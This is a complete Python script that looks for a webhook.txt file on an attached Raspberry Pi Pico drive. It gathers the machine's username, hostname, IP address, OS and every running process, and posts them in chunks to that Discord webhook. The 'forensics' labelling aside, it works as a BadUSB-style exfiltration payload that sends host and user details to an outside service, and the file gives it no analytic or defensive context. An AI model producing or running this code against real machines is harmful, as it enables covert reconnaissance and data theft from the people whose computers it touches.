import os
import platform
import socket
import getpass
import requests
import psutil

# === STEP 1: Detect Raspberry Pi Pico Drive and Get webhook.txt ===
def get_pico_drive_path():
    for drive_letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
        test_path = f"{drive_letter}:/webhook.txt"
        if os.path.exists(test_path):
            return test_path
    return None

def read_webhook_from_pico():
    webhook_path = get_pico_drive_path()
    if not webhook_path:
        print("[ERROR] Could not find webhook.txt on Raspberry Pi Pico.")
        return None
    try:
        with open(webhook_path, "r") as f:
            return f.read().strip()
    except Exception as e:
        print(f"[ERROR] Failed to read webhook.txt: {e}")
        return None

# === STEP 2: Collect Forensics Data ===
def get_system_info():
    info = {
        "Username": getpass.getuser(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "OS": f"{platform.system()} {platform.release()}",
        "Architecture": platform.machine()
    }
    return info

def get_running_processes():
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            processes.append(f"{proc.info['pid']}: {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return processes

# === STEP 3: Send to Discord Webhook ===
def send_to_discord(webhook_url, content):
    try:
        response = requests.post(webhook_url, json={"content": content})
        if response.status_code == 204:
            print("[INFO] Data sent successfully to Discord.")
        else:
            print(f"[ERROR] Failed to send message: {response.status_code}")
    except Exception as e:
        print(f"[ERROR] Exception occurred while sending: {e}")

# === MAIN ===
def main():
    webhook_url = read_webhook_from_pico()
    if not webhook_url:
        print("[ERROR] Webhook URL not found. Exiting.")
        return

    print("[INFO] Webhook URL loaded.")

    # Collect and send system info
    sys_info = get_system_info()
    sys_info_str = "**🖥️ System Information:**\n" + "\n".join(f"**{k}:** {v}" for k, v in sys_info.items())
    send_to_discord(webhook_url, sys_info_str)

    # Collect and send running processes
    processes = get_running_processes()
    chunk_size = 1800  # Discord limit safeguard

    send_to_discord(webhook_url, f"**⚙️ Running Processes (Total: {len(processes)}):**")
    for i in range(0, len(processes), 30):
        chunk = "\n".join(processes[i:i + 30])
        send_to_discord(webhook_url, f"```{chunk}```")

if __name__ == "__main__":
    main()